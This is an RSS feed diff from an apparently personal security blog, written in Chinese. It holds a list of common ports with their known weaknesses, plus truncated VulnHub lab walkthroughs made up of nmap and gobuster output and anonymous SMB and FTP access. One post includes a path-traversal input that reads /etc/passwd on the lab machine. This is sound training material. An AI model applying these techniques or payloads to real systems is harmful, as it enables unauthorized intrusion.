@@ -1,2 +1,1379 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>dehua</title><link>https://dehua-rd.github.io</link><description>The cloud is just someone else’s computer.</description><copyright>dehua</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/154585050?v=4</url><title>avatar</title><link>https://dehua-rd.github.io</link></image><lastBuildDate>Tue, 12 Aug 2025 16:35:33 +0000</lastBuildDate><managingEditor>dehua</managingEditor><ttl>60</ttl><webMaster>dehua</webMaster></channel></rss>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>dehua</title><link>https://dehua-rd.github.io</link><description>The cloud is just someone else’s computer.</description><copyright>dehua</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/154585050?v=4</url><title>avatar</title><link>https://dehua-rd.github.io</link></image><lastBuildDate>Wed, 13 Aug 2025 04:23:29 +0000</lastBuildDate><managingEditor>dehua</managingEditor><ttl>60</ttl><webMaster>dehua</webMaster><item><title>常见端口及其脆弱点</title><link>https://dehua-rd.github.io/post/chang-jian-duan-kou-ji-qi-cui-ruo-dian.html</link><description># 常见端口及其脆弱点
+## FTP (21/TCP)
+1. 默认用户名密码 anonymous:anonymous
+2. 暴力破解密码
+3. VSFTP某版本后门
+## SSH (22/TCP)
+1. 部分版本SSH存在漏洞可枚举用户名
+2. 暴力破解密码
+## Telent (23/TCP)
+1. 暴力破解密码
+2. 嗅探抓取明文密码
+## SMTP (25/TCP)
+1. 无认证时可伪造发件人
+## DNS (53/UDP &amp; 53/TCP)
+1. 域传送漏洞
+2. DNS劫持
+3. DNS缓存投毒
+4. DNS欺骗
+5. SPF / DMARC Check
+6. DDoS
+7. DNS Query Flood
+8. DNS 反弹
+9. DNS 隧道
+## DHCP 67/68
+1. 劫持/欺骗
+## TFTP (69/TCP)
+## HTTP (80/TCP)
+## Kerberos (88/TCP)
+1. 主要用于监听KDC的票据请求
+2. 用于进行黄金票据和白银票据的伪造
+## POP3 (110/TCP &amp; 995/TCP)
+1. 爆破
+## RPC (135/TCP)
+1. wmic 服务利用
+## NetBIOS (137/UDP &amp; 138/UDP)
+1. 未授权访问
+2. 弱口令
+## NetBIOS / Samba (139/TCP)
+1. 未授权访问
+2. 弱口令
+## IMAP (143/TCP &amp; 993/TCP)
+## SNMP (161/TCP &amp; 161/UDP)
+1. Public 弱口令
+## LDAP (389/TCP)
+1. 用于域上的权限验证服务
+2. 匿名访问
+3. 注入
+## HTTPS (443/TCP)
+## SMB (445/TCP)
+1. Windows 协议簇，主要功能为文件共享服务
+2. net use \\192.168.1.1 /user:xxx\username password
+## Linux Rexec (512/TCP &amp; 513/TCP &amp; 514/TCP)
+1. 弱口令
+## Rsync (873/TCP)
+1. 未授权访问
+## RPC (1025/TCP)
+1. NFS匿名访问
+## Java RMI (1090/TCP &amp; 1099/TCP)
+1. 反序列化远程命令执行漏洞
+## MSSQL (1433/TCP)
+1. 弱密码
+2. 差异备份 GetShell
+3. SA 提权
+## Oracle (1521/TCP)
+1. 弱密码
+## NFS (2049/TCP)
+1. 权限设置不当
+2. showmount &lt;host&gt;
+## ZooKeeper (2171/TCP &amp; 2375/TCP)
+1. 无身份认证
+## Docker Remote API (2375/TCP)
+1. 未限制IP / 未启用TLS身份认证
+2. http://docker.addr:2375/version
+## MySQL (3306/TCP)
+1. 弱密码
+2. 日志写WebShell
+3. UDF提权
+4. MOF提权
+## RDP / Terminal Services (3389/TCP)
+1. 弱密码
+## Postgres (5432/TCP)
+1. 弱密码
+2. 执行系统命令
+3. ## VNC (5900/TCP)
+4. 弱密码
+## CouchDB (5984/TCP)
+1. 未授权访问
+## WinRM (5985/TCP)
+1. Windows对WS-Management的实现
+2. 在Vista上需要手动启动，在Windows Server 2008中服务是默认开启的
+## Redis (6379/TCP)
+1. 无密码或弱密码
+2. 绝对路径写 WebShell
+3. 计划任务反弹 Shell
+4. 写 SSH 公钥
+5. 主从复制 RCE
+6. Windows 写启动项
+## Kubernetes API Server (6443/TCP &amp;&amp; 10250/TCP)
+1. https://Kubernetes:10250/pods
+## JDWP (8000/TCP)
+1. 远程命令执行
+## ActiveMQ (8061/TCP)
+## Jenkin (8080/TCP)
+1. 未授权访问
+## Elasticsearch (9200/TCP)
+1. 代码执行
+2. http://es.addr:9200/_plugin/head/
+3. http://es.addr:9200/_nodes
+## Memcached (11211/TCP &amp; 11211/UDP)
+1. 未授权访问
+## RabbitMQ (15672/TCP &amp; 15692/TCP &amp; 25672/TCP)
+## MongoDB (27017/TCP)
+1. 无密码或弱密码
+## Hadoop (50070/TCP &amp; 50075/TCP)
+1. 未授权访问
+除了以上列出的可能出现的问题，暴露在公网上的服务若不是最新版，都可能存在已经公开的漏洞。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/chang-jian-duan-kou-ji-qi-cui-ruo-dian.html</guid><pubDate>Wed, 13 Aug 2025 03:56:52 +0000</pubDate></item><item><title>信息收集</title><link>https://dehua-rd.github.io/post/xin-xi-shou-ji.html</link><description># 所有环节的入口
+信息收集在无论是漏洞挖掘还是渗透测试中都有着举足轻重的地位，一个好的信息收集可以让你少走许多弯路，能够更好的定向突破。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/xin-xi-shou-ji.html</guid><pubDate>Wed, 13 Aug 2025 03:51:10 +0000</pubDate></item><item><title>KioptrixVM3</title><link>https://dehua-rd.github.io/post/KioptrixVM3.html</link><description># 靶机信息
+KioptrixVM3是vulnhub中的一台简单难度的渗透测试靶机
+
+# 靶机初始枚举
+
+只开放了两个端口，攻击面很小，对信息收集的要求没那么高。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/KioptrixVM3.html</guid><pubDate>Wed, 30 Jul 2025 19:36:39 +0000</pubDate></item><item><title>CTF5</title><link>https://dehua-rd.github.io/post/CTF5.html</link><description># 靶机信息
+CTF5是vulnhub中的一台简单难度的渗透测试靶机
+
+# 靶机初始枚举
+tcp端口开放情况
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/CTF5]
+└─$ sudo nmap -sT -p$ports -sCV -O $ip -oA nmapScan/detail   
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 08:46 EDT
+Nmap scan report for 192.168.218.198
+Host is up (0.00029s latency).
+
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 4.7 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 05:c3:aa:15:2b:57:c7:f4:2b:d3:41:1c:74:76:cd:3d (DSA)
+|_  2048 43:fa:3c:08:ab:e7:8b:39:c3:d6:f3:a4:54:19:fe:a6 (RSA)
+25/tcp    open  smtp        Sendmail 8.14.1/8.14.1
+| smtp-commands: localhost.localdomain Hello [192.168.218.148], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP
+|_ 2.0.0 This is sendmail 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use 'HELP &lt;topic&gt;'. 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
+80/tcp    open  http        Apache httpd 2.2.6 ((Fedora))
+|_http-title: Phake Organization
+|_http-server-header: Apache/2.2.6 (Fedora)
+110/tcp   open  pop3        ipop3d 2006k.101
+|_ssl-date: 2025-07-30T08:49:39+00:00; -3h58m17s from scanner time.
+|_pop3-capabilities: LOGIN-DELAY(180) TOP USER STLS UIDL
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-04-29T11:31:53
+|_Not valid after:  2010-04-29T11:31:53
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100024  1          32768/udp   status
+|_  100024  1          58416/tcp   status
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
+143/tcp   open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-04-29T11:31:53
+|_Not valid after:  2010-04-29T11:31:53
+|_imap-capabilities: BINARY LOGIN-REFERRALS MULTIAPPEND WITHIN THREAD=REFERENCES UNSELECT UIDPLUS IDLE THREAD=ORDEREDSUBJECT SORT MAILBOX-REFERRALS completed CAPABILITY LITERAL+ CHILDREN NAMESPACE SCAN SASL-IR STARTTLSA0001 OK IMAP4REV1 ESEARCH
+|_ssl-date: 2025-07-30T08:49:40+00:00; -3h58m17s from scanner time.
+445/tcp   open  netbios-ssn Samba smbd 3.0.26a-6.fc8 (workgroup: MYGROUP)
+901/tcp   open  http        Samba SWAT administration server
+| http-auth: 
+| HTTP/1.0 401 Authorization Required\x0D
+|_  Basic realm=SWAT
+|_http-title: 401 Authorization Required
+3306/tcp  open  mysql       MySQL 5.0.45
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.0.45
+|   Thread ID: 6
+|   Capabilities flags: 41516
+|   Some Capabilities: Support41Auth, SupportsCompression, SupportsTransactions, LongColumnFlag, Speaks41ProtocolNew, ConnectWithDatabase
+|   Status: Autocommit
+|_  Salt: DgYfxG;/w,t'_-]n4V5F
+58416/tcp open  status      1 (RPC #100024)
+MAC Address: 00:0C:29:98:E5:38 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.30
+Network Distance: 1 hop
+Service Info: Hosts: localhost.localdomain, 192.168.218.198; OS: Unix
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.26a-6.fc8)
+|   Computer name: localhost
+|   NetBIOS computer name: 
+|   Domain name: localdomain
+|   FQDN: localhost.localdomain
+|_  System time: 2025-07-30T04:48:26-04:00
+|_clock-skew: mean: -2h58m16s, deviation: 2h00m00s, median: -3h58m17s
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 87.36 seconds
+```
+
+udp开放端口情况
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/CTF5]
+└─$ sudo nmap -sU -sCV -p111,5353,32768 --min-rate 1000 192.168.218.198 -oA nmapScan/udpdetail
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 08:49 EDT
+Nmap scan report for 192.168.218.198
+Host is up (0.00046s latency).
+
+PORT      STATE SERVICE VERSION
+111/udp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100024  1          32768/udp   status
+|_  100024  1          58416/tcp   status
+5353/udp  open  mdns    DNS-based service discovery
+| dns-service-discovery: 
+|   9/tcp workstation
+|     Address=192.168.218.198 fe80::20c:29ff:fe98:e538
+|   22/tcp ssh
+|_    Address=192.168.218.198 fe80::20c:29ff:fe98:e538
+32768/udp open  status  1 (RPC #100024)
+MAC Address: 00:0C:29:98:E5:38 (VMware)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
+```
+
+
+# SMB枚举
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/CTF5]
+└─$ smbclient -L //192.168.218.198 -N
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        homes           Disk      Home Directories
+        IPC$            IPC       IPC Service (Samba Server Version 3.0.26a-6.fc8)
+Reconnecting with SMB1 for workgroup listing.
+Anonymous login successful
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+```
+
+有个共享目录，但是需要密码，接着看
+
+# WEB枚举
+
+进去主页，也没有搜到什么利用点
+
+&lt;img width='1919' height='1033' alt='Image' src='https://github.com/user-attachments/assets/d15c06b5-3060-4c81-be1f-0a3751bedad1' /&gt;
+
+接着爆破一下目录，有很多
+
+```
+/inc                  (Status: 301) [Size: 315] [--&gt; http://192.168.218.198/inc/]
+/mail                 (Status: 301) [Size: 316] [--&gt; http://192.168.218.198/mail/]
+/index.php            (Status: 200) [Size: 1538]
+/info.php             (Status: 200) [Size: 50478]
+/events               (Status: 301) [Size: 318] [--&gt; http://192.168.218.198/events/]
+/phpmyadmin           (Status: 301) [Size: 322] [--&gt; http://192.168.218.198/phpmyadmin/]
+/list                 (Status: 301) [Size: 316] [--&gt; http://192.168.218.198/list/]
+/squirrelmail         (Status: 301) [Size: 324] [--&gt; http://192.168.218.198/squirrelmail/]
+/awstatsicons         (Status: 403) [Size: 294]
+/awstatscss           (Status: 403) [Size: 292]
+/awstatsclasses       (Status: 403) [Size: 296]
+/index.php            (Status: 200) [Size: 1538]
+```
+
+events下有登录框，感觉会有利用点，再看看别的
+
+&lt;img width='1919' height='1029' alt='Image' src='https://github.com/user-attachments/assets/007e1ad6-aeb0-44c8-a1db-4ec057ea79f2' /&gt;
+
+以及squirrelmail下，也有登录框
+
+&lt;img width='1919' height='1013' alt='Image' src='https://github.com/user-attachments/assets/31ee8dcd-a880-43f6-a8b5-c03b63692a76' /&gt;
+
+然后又在主页下翻，切换页面的时候上面有一个page参数，试一下文件包含，`../../../../../etc/passwd%00` 可以利用到漏洞
+
+&lt;img width='1919' height='914' alt='Image' src='https://github.com/user-attachments/assets/dec0f918-3e09-4d15-b220-b32888db693d' /&gt;
+
+到管理员登录框，先爆破一下这个
+
+&lt;img width='1908' height='1072' alt='Image' src='https://github.com/user-attachments/assets/b548fc38-216d-468d-abe1-1c65ad1b16f9' /&gt;
+
+NanoCMS爆破出了密码，登录进去了
+搜索到一个此版本的RCE漏洞，看看能否利用： 
+NanoCMS v0.4 在新增页面功能中，允许认证用户上传任意内容，并默认以 .php 后缀保存页面，而未进行任何代码执行防护或内容过滤。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/CTF5.html</guid><pubDate>Wed, 30 Jul 2025 17:11:17 +0000</pubDate></item><item><title>West_Wild_v1.1</title><link>https://dehua-rd.github.io/post/West_Wild_v1.1.html</link><description># 靶机信息
+
+West_Wild_v1.1是vulnhub中的一台简单难度的渗透测试靶机
+
+
+# 靶机初始枚举
+
+端口扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/West_Wild]
+└─$ sudo nmap -sT -p$port -sCV -O $ip -oA nmapScan/detail                              
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 13:51 EDT
+Nmap scan report for 192.168.218.197
+Host is up (0.00036s latency).
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 6f:ee:95:91:9c:62:b2:14:cd:63:0a:3e:f8:10:9e:da (DSA)
+|   2048 10:45:94:fe:a7:2f:02:8a:9b:21:1a:31:c5:03:30:48 (RSA)
+|   256 97:94:17:86:18:e2:8e:7a:73:8e:41:20:76:ba:51:73 (ECDSA)
+|_  256 23:81:c7:76:bb:37:78:ee:3b:73:e2:55:ad:81:32:72 (ED25519)
+80/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+MAC Address: 00:0C:29:A4:0C:C8 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
+Network Distance: 1 hop
+Service Info: Host: WESTWILD; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: WESTWILD, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-07-29T17:52:08
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: westwild
+|   NetBIOS computer name: WESTWILD\x00
+|   Domain name: \x00
+|   FQDN: westwild
+|_  System time: 2025-07-29T20:52:08+03:00
+|_clock-skew: mean: -59m29s, deviation: 1h43m55s, median: 30s
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.08 seconds
+```
+# SMB枚举
+
+匿名连接SMB
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/West_Wild]
+└─$ smbclient  //192.168.218.197/wave
+Password for [WORKGROUP\kali]:
+Try 'help' to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Tue Jul 30 01:18:56 2019
+  ..                                  D        0  Thu Aug  1 19:02:20 2019
+  FLAG1.txt                           N       93  Mon Jul 29 22:31:05 2019
+  message_from_aveng.txt              N      115  Tue Jul 30 01:21:48 2019
+
+                1781464 blocks of size 1024. 285212 blocks available
+smb: \&gt; get FLAG1.txt 
+getting file \FLAG1.txt of size 93 as FLAG1.txt (18.2 KiloBytes/sec) (average 18.2 KiloBytes/sec)
+smb: \&gt; get message_from_aveng.txt 
+getting file \message_from_aveng.txt of size 115 as message_from_aveng.txt (28.1 KiloBytes/sec) (average 22.6 KiloBytes/sec)
+smb: \&gt; exit
+```
+解码flag
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/West_Wild]
+└─$ cat FLAG1.txt | base64 -d
+Flag1{Welcome_T0_THE-W3ST-W1LD-B0rder}
+user:wavex
+password:door+open
+```
+获得一组凭据和flag1  **wavex:door+open**
+直接就ssh登录进去了
+```
+wavex@WestWild:~/wave$ cat message_from_aveng.txt 
+Dear Wave ,
+Am Sorry but i was lost my password ,
+and i believe that you can reset  it for me . 
+Thank You 
+Aveng 
+```
+有个消息说aveng忘记密码了。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/West_Wild_v1.1.html</guid><pubDate>Tue, 29 Jul 2025 18:54:06 +0000</pubDate></item><item><title>My_file_server_1</title><link>https://dehua-rd.github.io/post/My_file_server_1.html</link><description># 靶机信息
+My_file_server_1是vulnhub中的一台简单难度的渗透测试靶机
+# 初始信息枚举
+端口开放情况
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/MyFileServer1]
+└─$ sudo nmap -sT -p$ports -sV -O $ip -oA nmapScan/detail                  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 08:17 EDT
+Nmap scan report for 192.168.218.196
+Host is up (0.00039s latency).
+
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 3.0.2
+22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
+80/tcp    open  http        Apache httpd 2.4.6 ((CentOS))
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
+2049/tcp  open  nfs_acl     3 (RPC #100227)
+2121/tcp  open  ftp         ProFTPD 1.3.5
+20048/tcp open  mountd      1-3 (RPC #100005)
+MAC Address: 00:0C:29:70:8E:E9 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|storage-misc|router
+Running (JUST GUESSING): Linux 2.6.X|3.X|4.X|5.X (97%), Synology DiskStation Manager 5.X (97%), MikroTik RouterOS 7.X (90%)
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6.0 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+Aggressive OS guesses: Linux 2.6.32 - 3.13 (97%), Linux 3.4 - 3.10 (97%), Synology DiskStation Manager 5.2-5644 (97%), Linux 2.6.32 - 3.10 (97%), Linux 2.6.39 (97%), Linux 3.10 (95%), Linux 2.6.32 (94%), Linux 2.6.32 - 3.5 (92%), Linux 3.2 - 3.10 (91%), Linux 3.2 - 3.16 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: Host: FILESERVER; OS: Unix
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds
+```
+
+漏洞扫描也没扫出来什么漏洞。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/My_file_server_1.html</guid><pubDate>Tue, 29 Jul 2025 17:37:15 +0000</pubDate></item><item><title>billu</title><link>https://dehua-rd.github.io/post/billu.html</link><description># 靶机信息
+billu是vulnhub中的一台简单难度的渗透测试靶机
+
+# 初始信息枚举
+tcp端口扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/billu]
+└─$ sudo nmap -sT -sV -p22,80 -O 192.168.218.195 -oA nmapScan/detail
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 12:47 EDT
+Nmap scan report for 192.168.218.195
+Host is up (0.00055s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+MAC Address: 00:0C:29:21:56:B7 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.2 - 4.14 (98%), Linux 3.8 - 3.16 (98%), Linux 3.10 - 4.11 (94%), Linux 3.13 - 4.4 (94%), Linux 3.13 (94%), Linux 3.13 - 3.16 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Linux 4.10 (94%), Android 5.0 - 6.0.1 (Linux 3.4) (94%), Android 8 - 9 (Linux 3.18 - 4.4) (94%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
+```
+udp没有端口开放
+漏洞扫描没有扫出来什么信息
+
+# web枚举
+目录扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/billu]
+└─$ gobuster dir -u http://192.168.218.195 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x html,php,txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.218.195
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,php,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 319] [--&gt; http://192.168.218.195/images/]
+/test                 (Status: 200) [Size: 72]
+/test.php             (Status: 200) [Size: 72]
+/add                  (Status: 200) [Size: 307]
+/add.php              (Status: 200) [Size: 307]
+/c.php                (Status: 200) [Size: 1]
+/c                    (Status: 200) [Size: 1]
+/index.php            (Status: 200) [Size: 3267]
+/index                (Status: 200) [Size: 3267]
+/panel.php            (Status: 302) [Size: 2469] [--&gt; index.php]
+/panel                (Status: 302) [Size: 2469] [--&gt; index.php]
+/show                 (Status: 200) [Size: 1]
+/show.php             (Status: 200) [Size: 1]
+/in                   (Status: 200) [Size: 47531]
+/in.php               (Status: 200) [Size: 47535]
+/uploaded_images      (Status: 301) [Size: 328] [--&gt; http://192.168.218.195/uploaded_images/]
+/server-status        (Status: 403) [Size: 296]
+/head                 (Status: 200) [Size: 2793]
+/head.php             (Status: 200) [Size: 2793]
+/phpmy                (Status: 301) [Size: 318] [--&gt; http://192.168.218.195/phpmy/]
+/index.php            (Status: 200) [Size: 3267]
+/index                (Status: 200) [Size: 3267]
+Progress: 224656 / 224660 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+有很多目录可以访问，全部curl下来
+```
+┌──(kali㉿kali)-[~/…/writeup/vulnhub/billu/web]                                                                                                                                                     
+└─$ for dir in $(cat dir | awk -F '\(' '{print $1}' | tr -d '/' );do curl http://192.168.218.195/$dir &gt; $dir ;done 
+```
+先看主页，明确是sql注入，手注加sqlmap都没注入进去。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/billu.html</guid><pubDate>Mon, 28 Jul 2025 21:00:15 +0000</pubDate></item><item><title>Tr0ll</title><link>https://dehua-rd.github.io/post/Tr0ll.html</link><description># 靶机信息
+Tr0ll是vulnhub中的一台简单类型的渗透测试靶机
+
+# 靶机初始枚举
+tcp端口扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Tr0ll]
+└─$ sudo nmap -sV -p21,22,80 -O 192.168.218.194 -oA nmapScan/detail
+[sudo] kali 的密码：
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 08:53 EDT
+Nmap scan report for 192.168.218.194
+Host is up (0.00030s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+MAC Address: 00:0C:29:9B:9A:2D (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.82 seconds
+```
+漏洞扫描
+```
+┌──(kali㉿kali)-[~/…/writeup/vulnhub/Tr0ll/nmapScan]
+└─$ sudo nmap -p21,22,80 --script=vuln 192.168.218.194 -oA vuln         
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 09:06 EDT
+Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 98.97% done; ETC: 09:07 (0:00:00 remaining)
+Nmap scan report for 192.168.218.194
+Host is up (0.00028s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-enum: 
+|   /robots.txt: Robots file
+|_  /secret/: Potentially interesting folder
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+MAC Address: 00:0C:29:9B:9A:2D (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 320.81 seconds
+```
+
+
+# FTP端口利用
+anonymous匿名登录
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Tr0ll]
+└─$ ftp 192.168.218.194  
+Connected to 192.168.218.194.
+220 (vsFTPd 3.0.2)
+Name (192.168.218.194:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||53075|).
+150 Here comes the directory listing.
+-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
+226 Directory send OK.
+ftp&gt; binary
+200 Switching to Binary mode.
+ftp&gt; get lol.pcap
+local: lol.pcap remote: lol.pcap
+229 Entering Extended Passive Mode (|||5315|).
